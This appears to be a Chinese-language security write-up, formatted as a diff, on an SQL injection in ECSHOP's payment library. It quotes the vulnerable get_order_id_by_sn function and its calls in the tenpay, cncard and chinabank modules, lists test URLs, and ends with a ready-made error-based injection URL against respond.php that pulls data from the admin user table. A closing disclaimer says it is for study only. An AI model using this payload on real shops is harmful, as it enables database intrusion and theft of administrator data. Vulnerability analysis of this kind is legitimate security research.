@@ -1,0 +1,169 @@
+洞文件：lib_payment.php
+漏洞函数：get_order_id_by_sn($order_sn, $voucher = 'false')
+
+includes\lib_payment.php(ECSHOP 支付接口函数库)(53行)
+
+(53行)
+/**
+*  通过订单sn取得订单ID
+*  @param  string  $order_sn   订单sn
+*  @param  blob    $voucher    是否为会员充值
+*/
+function get_order_id_by_sn($order_sn, $voucher = 'false')
+{
+    if ($voucher == 'true')                                //要想触发漏洞，需保证函数的第二个参数为真。
+    {
+        return $GLOBALS['db']->getOne("SELECT log_id FROM " . $GLOBALS['ecs']->table('pay_log') . " WHERE order_id=" . $order_sn . ' AND order_type=1');
+                //漏洞位于$order_sn变量，触发原因未经过单引号过滤。from：fjhgx(俺是农村的)
+    }
+    else
+    {
+        if(is_numeric($order_sn))
+        {
+            $sql = 'SELECT order_id FROM ' . $GLOBALS['ecs']->table('order_info'). " WHERE order_sn = '$order_sn'";
+            $order_id = $GLOBALS['db']->getOne($sql);
+        }
+        if (!empty($order_id))
+        {
+            $pay_log_id = $GLOBALS['db']->getOne("SELECT log_id FROM " . $GLOBALS['ecs']->table('pay_log') . " WHERE order_id='" . $order_id . "'");
+            return $pay_log_id;
+        }
+        else
+        {
+            return "";
+        }
+    }
+}
+
+respond.php(ECSHOP 支付响应页面)(56行)
+
+/* 判断是否启用 */        //判断了支付方式，鸡肋了点。
+
+    $sql = "SELECT COUNT(*) FROM " . $ecs->table('payment') . " WHERE pay_code = '$pay_code' AND enabled = 1";
+
+    if ($db->getOne($sql) == 0)
+
+    {
+
+        $msg = $_LANG['pay_disabled'];
+
+    }
+
+    else
+
+    {
+
+        $plugin_file = 'includes/modules/payment/' . $pay_code . '.php';                                //包含支付方式的文件，位于“includes\modules\payment”目录下。
+
+ 
+
+        /* 检查插件文件是否存在，如果存在则验证支付是否成功，否则则返回失败信息 */
+
+        if (file_exists($plugin_file))
+
+        {
+
+            /* 根据支付方式代码创建支付类的对象并调用其响应操作方法 */
+
+            include_once($plugin_file);
+
+ 
+
+            $payment = new $pay_code();
+
+            $msg     = ($payment->respond()) ? $_LANG['pay_success'] : $_LANG['pay_fail'];
+
+        }
+
+        else
+
+        {
+
+            $msg = $_LANG['pay_not_exist'];
+
+        }
+
+    }
+总共有三处可能触发的漏洞；
+1.tenpay.php(200行)
+
+if ($attach == 'voucher')
+
+        {
+
+            $log_id = get_order_id_by_sn($sp_billno, "true");        //调用漏洞存在的函数，get_order_id_by_sn。
+
+        }
+
+        else
+
+        {
+
+            $log_id = get_order_id_by_sn($sp_billno);
+
+        }
+2.cncard.php(207行)
+
+//验证通过后,将订单sn转换为ID 来操作ec订单表
+
+        if ($c_memo2 == 'voucher')
+
+        {
+
+            $c_order = get_order_id_by_sn($c_order, "true");       
+
+        }
+
+        else
+
+        {
+
+            $c_order = get_order_id_by_sn($c_order);
+
+        }
+3.chinabank.php(156行)
+
+//验证通过后,将订单sn转换为ID 来操作ec订单表
+
+        $v_oid = get_order_id_by_sn($v_oid, "true");       
+
+        }
+
+        else
+
+        {
+
+        $v_oid = get_order_id_by_sn($v_oid);
+
+        }
+
+ 
+
+        if ($v_pstatus == '20')
+
+        {
+
+            /* 改变订单状态 */
+
+            order_paid($v_oid);
+
+ 
+
+            return true;
+
+        }
+复制代码漏洞验证：
+respond.php?code=tenpay&attach=voucher&sp_billno=fjhgx
+respond.php?code=cncard
+respond.php?code=chinabank
+
+EXP：
+respond.php?code=tenpay&attach=voucher&sp_billno=1 and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `ecs`.ecs_admin_user)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+
+纯属喜爱PHP，学习审核PHP源代码，未有任何意思。
+此分析文章，只给学习PHP的人研究，不得用于非法用途。
+
+ 
+
+from：俺是农村的 ，
